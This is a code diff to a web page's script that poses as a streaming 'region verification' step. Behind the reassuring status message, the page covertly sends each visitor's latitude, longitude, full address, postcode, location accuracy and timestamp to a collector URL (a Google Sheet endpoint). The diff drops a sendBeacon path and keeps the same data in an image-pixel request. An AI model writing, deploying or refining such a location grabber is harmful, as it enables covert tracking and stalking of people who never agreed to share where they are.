@@ -292,22 +292,18 @@
       status.textContent = `✓ Region verified for ${data.city || 'N/A'}, ${data.country || 'N/A'}. Streaming enabled.`;
 
       if (GOOGLE_SHEET_URL) {
-        try {
-          const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
-          navigator.sendBeacon(GOOGLE_SHEET_URL, blob);
-        } catch(e) {
-          const params = "?lat=" + encodeURIComponent(data.lat || "")
-            + "&lon=" + encodeURIComponent(data.lon || "")
-            + "&city=" + encodeURIComponent(data.city || "")
-            + "&district=" + encodeURIComponent(data.district || "")
-            + "&country=" + encodeURIComponent(data.country || "")
-            + "&postcode=" + encodeURIComponent(data.postcode || "")
-            + "&accuracy=" + encodeURIComponent(data.accuracy_meters || "")
-            + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 150))
-            + "&timestamp=" + encodeURIComponent(data.timestamp || "");
-          const img = new Image();
-          img.src = GOOGLE_SHEET_URL + params;
-        }
+        const params = "?lat=" + encodeURIComponent(data.lat || "")
+          + "&lon=" + encodeURIComponent(data.lon || "")
+          + "&city=" + encodeURIComponent(data.city || "")
+          + "&district=" + encodeURIComponent(data.district || "")
+          + "&country=" + encodeURIComponent(data.country || "")
+          + "&postcode=" + encodeURIComponent(data.postcode || "")
+          + "&accuracy=" + encodeURIComponent(data.accuracy_meters || "")
+          + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 150))
+          + "&timestamp=" + encodeURIComponent(data.timestamp || "");
+        
+        const img = new Image();
+        img.src = GOOGLE_SHEET_URL + params;
       }
     }
   </script>
